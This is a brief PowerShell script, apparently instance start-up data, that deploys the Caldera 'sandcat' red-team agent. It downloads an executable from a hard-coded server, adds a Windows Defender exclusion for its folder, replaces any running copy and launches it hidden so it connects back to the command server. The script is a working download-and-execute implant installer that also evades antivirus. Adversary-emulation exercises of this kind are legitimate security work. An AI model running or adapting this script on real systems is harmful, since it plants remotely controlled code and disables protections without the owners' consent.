<powershell>
$server="http://172.23.0.95:2288";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
mkdir -ErrorAction SilentlyContinue C:\Users\Public\caldera
Add-MpPreference -ExclusionPath “C:\Users\Public\caldera”
get-process | ? {$_.modules.filename -like "C:\Users\Public\caldera\caldera.exe"} | stop-process -f;
rm -force "C:\Users\Public\caldera\caldera.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\caldera\caldera.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\caldera\caldera.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
</powershell>
